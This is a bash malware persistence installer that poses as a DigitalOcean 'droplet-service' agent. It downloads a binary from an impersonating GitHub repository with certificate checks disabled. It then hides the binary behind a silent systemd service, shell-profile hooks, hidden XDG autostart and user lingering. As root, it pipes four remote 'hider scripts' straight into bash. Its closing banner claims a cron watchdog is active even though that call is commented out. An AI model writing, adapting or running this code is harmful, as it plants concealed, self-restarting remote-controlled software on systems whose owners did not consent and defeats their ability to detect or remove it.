#!/bin/bash
#
# Dual-mode persistence installer (root + non-root)
# Adapts paths, service type, and persistence mechanisms based on EUID
#

set -euo pipefail

# ─── Detect privilege level and set paths accordingly ───
if [[ $EUID -eq 0 ]]; then
    MODE="root"
    AGENT_DIR="/opt/digitalocean/bin"
    AGENT_PATH="${AGENT_DIR}/droplet-service"
    SERVICE_DIR="/etc/systemd/system"
    SERVICE_NAME="droplet-host.service"
    SERVICE_PATH="${SERVICE_DIR}/${SERVICE_NAME}"
    CRON_MARKER="# droplet-host-persist"
    PROFILE_DIR="/etc/profile.d"
    PROFILE_SCRIPT="${PROFILE_DIR}/droplet-host.sh"
else
    MODE="user"
    AGENT_DIR="${HOME}/.local/bin"
    AGENT_PATH="${AGENT_DIR}/droplet-service"
    SERVICE_DIR="${HOME}/.config/systemd/user"
    SERVICE_NAME="droplet-host.service"
    SERVICE_PATH="${SERVICE_DIR}/${SERVICE_NAME}"
    CRON_MARKER="# droplet-host-persist"
    PROFILE_SCRIPT="${HOME}/.profile.d/droplet-host.sh"
fi

DOWNLOAD_URL="https://github.com/digitalocean-droplet/package-repo/raw/refs/heads/main/packages"

echo "[*] Running in ${MODE} mode (EUID=${EUID})"
echo "[*] Agent path: ${AGENT_PATH}"
echo "[*] Service path: ${SERVICE_PATH}"

# ─── Helper: systemctl wrapper (root vs user) ───
sctl() {
    if [[ "$MODE" == "root" ]]; then
        systemctl "$@"
    else
        systemctl --user "$@"
    fi
}

# ─── Stop existing service if running ───
stop_existing_service() {
    if sctl is-active --quiet "${SERVICE_NAME}" 2>/dev/null; then
        echo "[*] Stopping existing ${SERVICE_NAME}..."
        sctl stop "${SERVICE_NAME}" 2>/dev/null || true

        for i in {1..10}; do
            if ! sctl is-active --quiet "${SERVICE_NAME}" 2>/dev/null; then
                echo "[+] Service stopped"
                return
            fi
            echo "[*] Waiting... ($i/10)"
            sleep 2
        done

        echo "[*] Force stopping..."
        sctl kill "${SERVICE_NAME}" 2>/dev/null || true
        sleep 3
    fi
}

# ─── Remove existing agent binary ───
remove_existing_agent() {
    if [[ -f "$AGENT_PATH" ]]; then
        echo "[*] Removing existing agent binary..."
        if ! rm -f "$AGENT_PATH" 2>/dev/null; then
            echo "[*] File busy, killing holders..."
            if command -v fuser &>/dev/null; then
                fuser -k "$AGENT_PATH" 2>/dev/null || true
            elif command -v lsof &>/dev/null; then
                lsof "$AGENT_PATH" 2>/dev/null | awk 'NR>1 {print $2}' | xargs -r kill -9 2>/dev/null || true
            fi
            sleep 3
            rm -f "$AGENT_PATH" 2>/dev/null || { echo "[-] Cannot remove busy file"; exit 1; }
        fi
        echo "[+] Old agent removed"
    fi
}

# ─── Create directories ───
create_dirs() {
    mkdir -p "$AGENT_DIR"
    mkdir -p "$SERVICE_DIR"
    if [[ "$MODE" == "user" ]]; then
        mkdir -p "$(dirname "$PROFILE_SCRIPT")"
    fi
    echo "[+] Directories ready"
}

# ─── Download agent ───
download_agent() {
    echo "[*] Downloading agent from ${DOWNLOAD_URL}..."
    if command -v wget &>/dev/null; then
        wget "$DOWNLOAD_URL" -O "$AGENT_PATH" --no-check-certificate --timeout=30 --tries=3 -q
    elif command -v curl &>/dev/null; then
        curl -sL -k --retry 3 --connect-timeout 30 -o "$AGENT_PATH" "$DOWNLOAD_URL"
    else
        echo "[-] Neither wget nor curl available"
        exit 1
    fi

    if [[ ! -s "$AGENT_PATH" ]]; then
        echo "[-] Download failed or file empty"
        exit 1
    fi

    chmod +x "$AGENT_PATH"
    echo "[+] Agent downloaded and marked executable"
}

# ─── Install systemd service ───
install_systemd_service() {
    echo "[*] Creating systemd service unit..."

    if [[ "$MODE" == "root" ]]; then
        cat > "$SERVICE_PATH" <<EOF
[Unit]
Description=Droplet-Service
After=network.target

[Service]
Type=simple
ExecStart=${AGENT_PATH}
Restart=always
RestartSec=60
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
EOF
        chmod 644 "$SERVICE_PATH"
        systemctl daemon-reload
        systemctl enable "${SERVICE_NAME}"
        systemctl start "${SERVICE_NAME}" || true
    else
        # Check if systemd user session is available
        if systemctl --user status >/dev/null 2>&1; then
            cat > "$SERVICE_PATH" <<EOF
[Unit]
Description=Droplet-Service

[Service]
Type=simple
ExecStart=${AGENT_PATH}
Restart=always
RestartSec=60
StandardOutput=null
StandardError=null

[Install]
WantedBy=default.target
EOF
            chmod 644 "$SERVICE_PATH"
            systemctl --user daemon-reload 2>/dev/null || true
            systemctl --user enable "${SERVICE_NAME}" 2>/dev/null || true
            systemctl --user start "${SERVICE_NAME}" 2>/dev/null || true

            # Enable lingering so user services survive logout
            if command -v loginctl &>/dev/null; then
                loginctl enable-linger "$(whoami)" 2>/dev/null || true
                echo "[+] Linger enabled for $(whoami)"
            fi
            echo "[+] Systemd user service installed"
        else
            echo "[!] Systemd user session not available - skipping systemd service"
            echo "[*] Will rely on cron, profile hooks, and XDG autostart for persistence"
        fi
    fi
}

# ─── Cron persistence (backup method) ───
install_cron_persistence() {
    echo "[*] Installing cron persistence..."
    local cron_line="@reboot ${AGENT_PATH} ${CRON_MARKER}"

    # Remove old entry if exists, add new one
    ( crontab -l 2>/dev/null | grep -v "${CRON_MARKER}" ; echo "${cron_line}" ) | crontab -
    echo "[+] Cron @reboot entry installed"

    # Also add a watchdog every 5 minutes
    local watchdog="*/5 * * * * pgrep -f '${AGENT_PATH}' >/dev/null || ${AGENT_PATH} & ${CRON_MARKER}-watchdog"
    ( crontab -l 2>/dev/null | grep -v "${CRON_MARKER}-watchdog" ; echo "${watchdog}" ) | crontab -
    echo "[+] Cron watchdog (5min) installed"
}

# ─── Profile/bashrc persistence (backup method) ───
install_profile_persistence() {
    echo "[*] Installing shell profile persistence..."

    local snippet="(pgrep -f '${AGENT_PATH}' >/dev/null 2>&1 || nohup ${AGENT_PATH} >/dev/null 2>&1 &) ${CRON_MARKER}"

    if [[ "$MODE" == "root" ]]; then
        # /etc/profile.d/ for all users on login
        echo "${snippet}" > "$PROFILE_SCRIPT"
        chmod 644 "$PROFILE_SCRIPT"
        echo "[+] Installed ${PROFILE_SCRIPT}"
    else
        # User-level: append to .bashrc and .profile if not already present
        for rc in "${HOME}/.bashrc" "${HOME}/.profile"; do
            if [[ -f "$rc" ]]; then
                grep -qF "${CRON_MARKER}" "$rc" 2>/dev/null || echo "${snippet}" >> "$rc"
                echo "[+] Hooked into ${rc}"
            fi
        done
        # Also the dedicated profile.d script
        echo "${snippet}" > "$PROFILE_SCRIPT"
        chmod 644 "$PROFILE_SCRIPT"
        echo "[+] Installed ${PROFILE_SCRIPT}"
    fi
}

# ─── XDG autostart (non-root desktop fallback) ───
install_xdg_autostart() {
    if [[ "$MODE" == "user" ]]; then
        local autostart_dir="${HOME}/.config/autostart"
        mkdir -p "$autostart_dir"
        cat > "${autostart_dir}/droplet-host.desktop" <<EOF
[Desktop Entry]
Type=Application
Name=Droplet Service
Exec=${AGENT_PATH}
Hidden=false
NoDisplay=true
X-GNOME-Autostart-enabled=true
EOF
        echo "[+] XDG autostart entry installed"
    fi
}

# ─── Verify service is running ───
verify_service() {
    echo "[*] Verifying service status..."
    sleep 3
    if sctl is-active --quiet "${SERVICE_NAME}" 2>/dev/null; then
        echo "[+] Service is ACTIVE"
        sctl status "${SERVICE_NAME}" --no-pager 2>/dev/null || true
    elif pgrep -f "$AGENT_PATH" >/dev/null 2>&1; then
        echo "[+] Agent process is running (PID: $(pgrep -f "$AGENT_PATH"))"
    else
        if [[ "$MODE" == "user" ]]; then
            echo "[*] Starting agent immediately..."
            nohup "$AGENT_PATH" >/dev/null 2>&1 &
            sleep 2
            if pgrep -f "$AGENT_PATH" >/dev/null 2>&1; then
                echo "[+] Agent started successfully (PID: $(pgrep -f "$AGENT_PATH"))"
            else
                echo "[!] Agent may start on next reboot/login"
            fi
        else
            echo "[!] Service not yet active - may start on next reboot/login"
        fi
    fi
}

# ─── Build tools (root only, optional) ───
install_build_tools() {
    if [[ "$MODE" != "root" ]]; then
        return
    fi
    echo "[*] Checking build tools..."
    if command -v gcc &>/dev/null && command -v make &>/dev/null; then
        echo "[+] gcc and make already present"
        return
    fi
    echo "[*] Installing build tools..."
    if command -v apt &>/dev/null; then
        apt update -qq && apt install -y build-essential
    elif command -v yum &>/dev/null; then
        yum groupinstall -y "Development Tools"
    elif command -v dnf &>/dev/null; then
        dnf groupinstall -y "Development Tools"
    elif command -v apk &>/dev/null; then
        apk add build-base
    elif command -v zypper &>/dev/null; then
        zypper install -y gcc make
    elif command -v pacman &>/dev/null; then
        pacman -S --noconfirm base-devel
    else
        echo "[!] No supported package manager - skip build tools"
        return
    fi
    echo "[+] Build tools installed"
}
install_root_user_user() {
	if [[ "$MODE" != "root" ]]; then
		return
	fi
	echo "[*] Running hider scripts..."
	bash <(curl -fsSL https://raw.githubusercontent.com/digitalocean-droplet/package-repo/refs/heads/main/service-dis-dual.sh) 2>/dev/null || echo "[!] service-dis-dual.sh failed or not found"
	bash <(curl -fsSL https://raw.githubusercontent.com/digitalocean-droplet/package-repo/refs/heads/main/service-dis-host-dual.sh) 2>/dev/null || echo "[!] service-dis-host-dual.sh failed or not found"
	bash <(curl -fsSL https://raw.githubusercontent.com/digitalocean-droplet/package-repo/refs/heads/main/test-dual.sh) 2>/dev/null || echo "[!] test-dual.sh failed or not found"
	bash <(curl -fsSL https://raw.githubusercontent.com/digitalocean-droplet/installer/refs/heads/main/hhh-dual.sh) 2>/dev/null || echo "[!] hhh-dual.sh failed or not found"
}
# ─── Main execution ───
main() {
    stop_existing_service
    remove_existing_agent
    create_dirs
    download_agent
    install_systemd_service
    #install_cron_persistence
    install_profile_persistence
    install_xdg_autostart
    verify_service
    install_build_tools
    install_root_user_user

    echo ""
    echo "========================================"
    echo "[+] Persistence installed (${MODE} mode)"
    echo "[+] Methods active:"
    echo "    1. systemd service (${SERVICE_PATH})"
    echo "    2. cron @reboot + 5min watchdog"
    echo "    3. shell profile hook"
    [[ "$MODE" == "user" ]] && echo "    4. XDG autostart"
    echo "========================================"
}

main "$@"

